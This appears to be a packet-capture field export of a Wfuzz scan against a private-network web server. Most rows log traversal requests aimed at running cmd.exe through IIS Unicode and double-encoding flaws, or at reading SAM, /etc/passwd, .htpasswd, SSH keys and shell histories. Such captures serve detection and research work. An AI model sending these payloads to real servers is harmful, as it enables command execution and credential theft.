http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/MSADC/..%%35c..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+dir+c:\/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/MSADC/..%%35c..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+dir+c:\/
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									2501,2501,2501,2501,2501,2501,2501,2501,2501,2501,2501,2501,2501,2501,2501,2501,2501,2501,2501,2501						1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1	http://192.168.1.109/web/..%255c..%255c..%255c..%255c..%255c../windows/repair/sam/,http://192.168.1.109/web/..%2F..%2F..%2F..%2F..%2F../winnt/repair/sam._/,http://192.168.1.109/web/................../boot.ini/,http://192.168.1.109/web/........../autoexec.bat/,http://192.168.1.109/web/....../config.sys/,http://192.168.1.109/web/..\..\..\..\..\..\autoexec.bat/,http://192.168.1.109/web/.htpasswd//,http://192.168.1.109/web/.htpasswd/,http://192.168.1.109/web/.html/............/autoexec.bat/,http://192.168.1.109/web/.html/............./config.sys/,http://192.168.1.109/web/.html/............*/config.sys/,http://192.168.1.109/web/.htaccess//,http://192.168.1.109/web/.htaccess/,http://192.168.1.109/web/.bashrc/,http://192.168.1.109/web/..\\..\\..\\..\\..\\..\\..\\boot.ini/,http://192.168.1.109/web/.psql_history/,http://192.168.1.109/web/DEASLog02.nsf/,http://192.168.1.109/web/CFIDE/probe.cfm/,http://192.168.1.109/web/.ssh/known_hosts/,http://192.168.1.109/web/ISSamples/SQLQHit.asp/,http://192.168.1.109/web/MSADC/..%%35%63..%%35%63..%%35%63..%%35%63winnt/system32/cmd.exe?/c+dir+c:\/		GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/..%255c..%255c..%255c..%255c..%255c../windows/repair/sam/,/web/..%2F..%2F..%2F..%2F..%2F../winnt/repair/sam._/,/web/................../boot.ini/,/web/........../autoexec.bat/,/web/....../config.sys/,/web/..\..\..\..\..\..\autoexec.bat/,/web/.htpasswd//,/web/.htpasswd/,/web/.html/............/autoexec.bat/,/web/.html/............./config.sys/,/web/.html/............*/config.sys/,/web/.htaccess//,/web/.htaccess/,/web/.bashrc/,/web/..\\..\\..\\..\\..\\..\\..\\boot.ini/,/web/.psql_history/,/web/DEASLog02.nsf/,/web/CFIDE/probe.cfm/,/web/.ssh/known_hosts/,/web/ISSamples/SQLQHit.asp/,/web/MSADC/..%%35%63..%%35%63..%%35%63..%%35%63winnt/system32/cmd.exe?/c+dir+c:\/
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									2539,2539,2539,2539,2539,2539,2539,2539,2539,2539,2539,2539						1,1,1,1,1,1,1,1,1,1,1,1,1	http://192.168.1.109/web/..%252f..%252f..%252f..%252f..%252f../winnt/repair/sam._/,http://192.168.1.109/web/................../etc/passwd/,http://192.168.1.109/web/..../Windows/Admin.pwl/,http://192.168.1.109/web/....../boot.ini/,http://192.168.1.109/web/..\..\..\..\..\autoexec.bat/,http://192.168.1.109/web/.forward/,http://192.168.1.109/web/..\..\autoexec.bat/,http://192.168.1.109/web/.plan/,http://192.168.1.109/web/DEASLog.nsf/,http://192.168.1.109/web/CFIDE/administrator/index.cfm/,http://192.168.1.109/web/.ssh/authorized_keys/,http://192.168.1.109/web/IISSAMPLES/ExAir/Search/search.asp/,http://192.168.1.109/web/MSADC/..%u00255c../..%u00255c../winnt/system32/cmd.exe?/c+dir/		GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/..%252f..%252f..%252f..%252f..%252f../winnt/repair/sam._/,/web/................../etc/passwd/,/web/..../Windows/Admin.pwl/,/web/....../boot.ini/,/web/..\..\..\..\..\autoexec.bat/,/web/.forward/,/web/..\..\autoexec.bat/,/web/.plan/,/web/DEASLog.nsf/,/web/CFIDE/administrator/index.cfm/,/web/.ssh/authorized_keys/,/web/IISSAMPLES/ExAir/Search/search.asp/,/web/MSADC/..%u00255c../..%u00255c../winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/MSADC/..%u005c../..%u005c../winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/MSADC/..%u005c../..%u005c../winnt/system32/cmd.exe?/c+dir/
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									2596,2596,2596,2596,2596,2596,2596,2596,2596,2596,2596,2596,2596						1,1,1,1,1,1,1,1,1,1,1,1,1,1	http://192.168.1.109/web/..%252f..%252f..%252f..%252f..%252f../winnt/repair/sam/,http://192.168.1.109/web/..%255c..%255c..%255c..%255c..%255c../winnt/repair/sam._/,http://192.168.1.109/web/............../boot.ini/,http://192.168.1.109/web/.../.../.../.../.../.../.../.../.../.../etc/passwd/,http://192.168.1.109/web/......../boot.ini/,http://192.168.1.109/web/.jsp/WEB-INF/classes/Env.java/,http://192.168.1.109/web/.//,http://192.168.1.109/web/.perf/,http://192.168.1.109/web///etc/hosts/,http://192.168.1.109/web/DB4Web/10.10.10.10:100/,http://192.168.1.109/web/Admin//,http://192.168.1.109/web/Data/settings.xml+/,http://192.168.1.109/web/JUNK(10)abcd.html/,http://192.168.1.109/web/MSADC/..%u002f../..%u002f../winnt/system32/cmd.exe?/c+dir/		GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/..%252f..%252f..%252f..%252f..%252f../winnt/repair/sam/,/web/..%255c..%255c..%255c..%255c..%255c../winnt/repair/sam._/,/web/............../boot.ini/,/web/.../.../.../.../.../.../.../.../.../.../etc/passwd/,/web/......../boot.ini/,/web/.jsp/WEB-INF/classes/Env.java/,/web/.//,/web/.perf/,/web///etc/hosts/,/web/DB4Web/10.10.10.10:100/,/web/Admin//,/web/Data/settings.xml+/,/web/JUNK(10)abcd.html/,/web/MSADC/..%u002f../..%u002f../winnt/system32/cmd.exe?/c+dir/
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									2651,2651,2651,2651,2651,2651,2651,2651,2651,2651,2651,2651,2651,2651						1,1,1,1,1,1,1,1,1,1,1,1,1,1,1	http://192.168.1.109/web/%3f.jsp/,http://192.168.1.109/web/.................../boot.ini/,http://192.168.1.109/web/.............../boot.ini/,http://192.168.1.109/web/....../etc/hosts/,http://192.168.1.109/web/........../boot.ini/,http://192.168.1.109/web/.jpilot//,http://192.168.1.109/web/.access/,http://192.168.1.109/web/.nsconfig/,http://192.168.1.109/web/.ssh/,http://192.168.1.109/web/Config1.htm/,http://192.168.1.109/web/ASPSamp/AdvWorks/equipment/catalog_type.asp/,http://192.168.1.109/web/Gozila.cgi/,http://192.168.1.109/web/JUNK(5).csp/,http://192.168.1.109/web/JUNK(6).cfm?mode=debug/,http://192.168.1.109/web/PBServer/.%u002e/.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir/		GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/%3f.jsp/,/web/.................../boot.ini/,/web/.............../boot.ini/,/web/....../etc/hosts/,/web/........../boot.ini/,/web/.jpilot//,/web/.access/,/web/.nsconfig/,/web/.ssh/,/web/Config1.htm/,/web/ASPSamp/AdvWorks/equipment/catalog_type.asp/,/web/Gozila.cgi/,/web/JUNK(5).csp/,/web/JUNK(6).cfm?mode=debug/,/web/PBServer/.%u002e/.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir/
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									2678,2678,2678,2678,2678,2678,2678,2678,2678,2678						1,1,1,1,1,1,1,1,1,1,1	http://192.168.1.109/web/../boot.ini/,http://192.168.1.109/web/..\..\..\..\..\..\temp\temp.class/,http://192.168.1.109/web/.history/,http://192.168.1.109/web/..\..\..\autoexec.bat/,http://192.168.1.109/web/.profile/,http://192.168.1.109/web/DEASLog01.nsf/,http://192.168.1.109/web/AdvWorks/equipment/catalog_type.asp/,http://192.168.1.109/web/.sh_history/,http://192.168.1.109/web/GetFile.cfm?FT=Text&FST=Plain&FilePath=C:\\WINNT\\repair\\sam._/,http://192.168.1.109/web/LOGIN.PWD/,http://192.168.1.109/web/PBServer/.%u002e/.%u002e/.%u002e/.%u002e/.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir/		GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/../boot.ini/,/web/..\..\..\..\..\..\temp\temp.class/,/web/.history/,/web/..\..\..\autoexec.bat/,/web/.profile/,/web/DEASLog01.nsf/,/web/AdvWorks/equipment/catalog_type.asp/,/web/.sh_history/,/web/GetFile.cfm?FT=Text&FST=Plain&FilePath=C:\\WINNT\\repair\\sam._/,/web/LOGIN.PWD/,/web/PBServer/.%u002e/.%u002e/.%u002e/.%u002e/.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir/
*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109									2742						1,1	http://192.168.1.109/web/MSADC/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\/,http://192.168.1.109/web/PBServer/..%%35%63..%%35%63..%%35%63winnt/system32/cmd.exe?/c+dir+c:\/		GET,GET				HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0				/web/MSADC/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\/,/web/PBServer/..%%35%63..%%35%63..%%35%63winnt/system32/cmd.exe?/c+dir+c:\/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/PBServer/..%%35%63../..%%35%63winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/PBServer/..%%35%63../..%%35%63winnt/system32/cmd.exe?/c+dir/
*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109									2782						1,1	http://192.168.1.109/web/MWS/HandleSearch.html?searchTarget=test&B1=Submit/,http://192.168.1.109/web/PBServer/..%u002f../..%u002f../..%u002f../winnt/system32/cmd.exe?/c+dir/		GET,GET				HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0				/web/MWS/HandleSearch.html?searchTarget=test&B1=Submit/,/web/PBServer/..%u002f../..%u002f../..%u002f../winnt/system32/cmd.exe?/c+dir/
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									2806,2806,2806,2806,2806,2806,2806,2806,2806,2806						1,1,1,1,1,1,1,1,1,1,1	http://192.168.1.109/web/../config.dat/,http://192.168.1.109/web/..\..\..\..\autoexec.bat/,http://192.168.1.109/web/.bash_history/,http://192.168.1.109/web/.mysql_history/,http://192.168.1.109/web/.procmailrc/,http://192.168.1.109/web/DEASAppDesign.nsf/,http://192.168.1.109/web/Admin_files/order.log/,http://192.168.1.109/web/DEASLog05.nsf/,http://192.168.1.109/web/IlohaMail/blank.html/,http://192.168.1.109/web/NetDetector/middle_help_intro.htm/,http://192.168.1.109/web/Rpc/..%%35c../..%%35c../..%%35c../winnt/system32/cmd.exe?/c+dir/		GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/../config.dat/,/web/..\..\..\..\autoexec.bat/,/web/.bash_history/,/web/.mysql_history/,/web/.procmailrc/,/web/DEASAppDesign.nsf/,/web/Admin_files/order.log/,/web/DEASLog05.nsf/,/web/IlohaMail/blank.html/,/web/NetDetector/middle_help_intro.htm/,/web/Rpc/..%%35c../..%%35c../..%%35c../winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/Rpc/..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+dir+c:\/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/Rpc/..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+dir+c:\/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/Rpc/..%%35%63../..%%35%63winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/Rpc/..%%35%63../..%%35%63winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/Rpc/..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/Rpc/..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/Rpc/..%%35%63..%%35%63..%%35%63winnt/system32/cmd.exe?/c+dir+c:\/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/Rpc/..%%35%63..%%35%63..%%35%63winnt/system32/cmd.exe?/c+dir+c:\/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/Rpc/.%u002e/.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/Rpc/.%u002e/.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/Rpc/.%u002e/.%u002e/.%u002e/.%u002e/.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/Rpc/.%u002e/.%u002e/.%u002e/.%u002e/.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir/
*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109									3065						1,1	http://192.168.1.109/web/PBServer/..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+dir+c:\/,http://192.168.1.109/web/PBServer/check.bat/..%u005c../..%u005cwinnt/system32/cmd.exe?/c+dir/		GET,GET				HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0				/web/PBServer/..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+dir+c:\/,/web/PBServer/check.bat/..%u005c../..%u005cwinnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/PBServer/check.bat/..%u002f../..%u002fwinnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/PBServer/check.bat/..%u002f../..%u002fwinnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/PBServer/check.bat/..%u00255c../..%u00255cwinnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/PBServer/check.bat/..%u00255c../..%u00255cwinnt/system32/cmd.exe?/c+dir/
*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109									3127,3127						1,1,1	http://192.168.1.109/web/MSADC/..%25%35%63..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+dir+c:\/,http://192.168.1.109/web/README.TXT/,http://192.168.1.109/web/PBServer/check.bat/..%%35c../..%%35cwinnt/system32/cmd.exe?/c+dir/		GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/MSADC/..%25%35%63..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+dir+c:\/,/web/README.TXT/,/web/PBServer/check.bat/..%%35c../..%%35cwinnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/PBServer/check.bat/..%%35%63../..%%35%63winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/PBServer/check.bat/..%%35%63../..%%35%63winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/PBServer/check.bat/.%u002e/.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/PBServer/check.bat/.%u002e/.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/PBServer/..%u005c../..%u005cwinnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/PBServer/..%u005c../..%u005cwinnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/PBServer/..%u005c../..%u005c../..%u005c../winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/PBServer/..%u005c../..%u005c../..%u005c../winnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/PBServer/..%u00255c../..%u00255cwinnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/PBServer/..%u00255c../..%u00255cwinnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/PBServer/..%u002f../..%u002fwinnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/PBServer/..%u002f../..%u002fwinnt/system32/cmd.exe?/c+dir/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/PBServer/..%u00255c../..%u00255c../..%u00255c../winnt/system32/cmd.exe?/c+dir/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/PBServer/..%u00255c../..%u00255c../..%u00255c../winnt/system32/cmd.exe?/c+dir/
*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109									3261,3261						1,1,1	http://192.168.1.109/web/Orders/order.log/,http://192.168.1.109/web/ProductCart/pc/msg.asp?|-|0|404_Object_Not_Found/,http://192.168.1.109/web/PBServer/..%%35c../..%%35cwinnt/system32/cmd.exe?/c+dir/		GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/Orders/order.log/,/web/ProductCart/pc/msg.asp?|-|0|404_Object_Not_Found/,/web/PBServer/..%%35c../..%%35cwinnt/system32/cmd.exe?/c+dir/
